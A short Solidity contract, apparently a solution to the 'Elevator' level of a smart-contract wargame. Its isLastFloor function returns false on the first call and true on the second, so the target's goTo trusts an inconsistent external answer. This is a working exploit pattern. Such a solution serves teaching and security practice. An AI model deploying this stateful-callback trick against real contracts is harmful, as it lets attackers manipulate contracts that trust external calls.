// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.26;

import {Elevator} from "./Elevator.sol";

contract MaliciousElevator {
    uint256 counter;
    Elevator immutable target;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function attack() external {
        target.goTo(0);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (counter == 1) return true;

        counter++;
        return false;
    }
}
